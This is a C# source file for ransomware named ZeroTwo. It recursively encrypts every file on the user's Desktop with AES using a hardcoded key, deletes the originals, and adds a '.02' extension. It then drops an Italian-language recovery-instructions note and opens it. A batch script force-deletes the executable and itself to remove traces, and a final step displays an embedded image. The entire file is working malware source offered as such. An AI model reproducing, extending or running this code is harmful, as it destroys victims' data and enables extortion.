using System;
using System.IO;
using System.Security.Cryptography;
using System.Reflection;
using System.Diagnostics;

namespace ZeroTwo.src {
    class ZeroTwo {
        private const string EXT = ".02";

        public static void Main() {
            Exec();
            ReleaseIstructions();
            SelfDel();
            OpenImage();
        }

        private static void OpenImage() {
            var imageRes = "ZeroTwo.src.img.ZeroTwo";
            string exePath = Assembly.GetExecutingAssembly().CodeBase.Replace("file:///", string.Empty);
            int index = exePath.LastIndexOf("/");
            string exeFolder = exePath.Substring(0, index);
            string imagePath = (exeFolder + "/ZeroTwo.jpg").Replace("/", "\\");

            try {
                if (File.Exists(imagePath))
                    File.Delete(imagePath);

                if (!Directory.Exists(Path.GetDirectoryName(imagePath)))
                    Directory.CreateDirectory(Path.GetDirectoryName(imagePath));

                using (Stream sfile = Assembly.GetExecutingAssembly().GetManifestResourceStream(imageRes)) {
                    byte[] buf = new byte[sfile.Length];
                    sfile.Read(buf, 0, Convert.ToInt32(sfile.Length));

                    using (FileStream fs = File.Create(imagePath)) {
                        fs.Write(buf, 0, Convert.ToInt32(sfile.Length));
                        fs.Close();
                    }
                }
                Process.Start(imagePath);
            } catch (Exception ex) {
                throw new Exception(string.Format("Can't extract resource '{0}' to file '{1}': {2}", imageRes, imagePath, ex.Message), ex);
            }
        }

        private static void SelfDel() {
            string batchCommands = string.Empty;
            string exePath = Assembly.GetExecutingAssembly().CodeBase.Replace("file:///", string.Empty).Replace("/", "\\");

            batchCommands += "@ECHO OFF\n";                         // Do not show any output
            batchCommands += "ping 127.0.0.1 > nul\n";              // Wait approximately 4 seconds (so that the process is already terminated)
            batchCommands += "echo j | del /F ";                    // Delete the executeable
            batchCommands += "\"" + exePath + "\"" + "\n";
            batchCommands += "echo j | del del.bat";    // Delete this bat file

            File.WriteAllText("del.bat", batchCommands);
            Process.Start("del.bat");
        }

        private static void Exec() {
            string mainPath = "C:/users/" + Environment.UserName + "/Desktop";
            string[] files = Directory.GetFiles(mainPath, "*.*", SearchOption.AllDirectories);
            foreach (string file in files) {
                if (!Path.GetExtension(file).Equals(EXT) && !Path.GetExtension(file).Equals(".ini") && !Path.GetExtension(file).Equals(".exe")) {
                    ToggleCipher(true, file, file + EXT, new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 });
                }
                if (Path.GetExtension(file).Equals(EXT)) {
                    //ToggleCipher(false, file, file.Remove(file.Length - EXT.Length), new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 });
                }
            }
        }

        private static void ToggleCipher(bool encryptMode, string inputFile, string outputFile, byte[] passwordBytes) {
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            string cryptFile = null;
            if (encryptMode) {
                cryptFile = outputFile;
            }

            FileStream fsCrypt;
            if (encryptMode) {
                fsCrypt = new FileStream(cryptFile, FileMode.Create);
            } else {
                fsCrypt = new FileStream(inputFile, FileMode.Open);
            }

            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;

            var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            AES.Padding = PaddingMode.Zeros;
            AES.Mode = CipherMode.CBC;

            CryptoStream cs;
            if (encryptMode) {
                cs = new CryptoStream(fsCrypt,
                AES.CreateEncryptor(),
                CryptoStreamMode.Write);
            } else {
                cs = new CryptoStream(fsCrypt,
                AES.CreateDecryptor(),
                CryptoStreamMode.Read);
            }

            FileStream fs;
            if (encryptMode) {
                fs = new FileStream(inputFile, FileMode.Open);
            } else {
                fs = new FileStream(outputFile, FileMode.Create);
            }

            int data;
            if (encryptMode) {
                while ((data = fs.ReadByte()) != -1)
                    cs.WriteByte((byte)data);
            } else {
                while ((data = cs.ReadByte()) != -1)
                    fs.WriteByte((byte)data);
            }

            fs.Close();
            cs.Close();
            fsCrypt.Close();

            File.Delete(inputFile);
        }


        public static void ReleaseIstructions() {
            var assembly = Assembly.GetExecutingAssembly();
            var instructionsRes = "ZeroTwo.src.txt.Instructions";

            using (Stream stream = assembly.GetManifestResourceStream(instructionsRes))
            using (StreamReader reader = new StreamReader(stream)) {
                string instructions = reader.ReadToEnd();
                string instructionsPath = "C:/users/" + Environment.UserName + "/Desktop/Istruzioni recupero.txt";
                File.WriteAllText(instructionsPath, instructions);
                Process.Start(instructionsPath);
            }
        }
    }
}
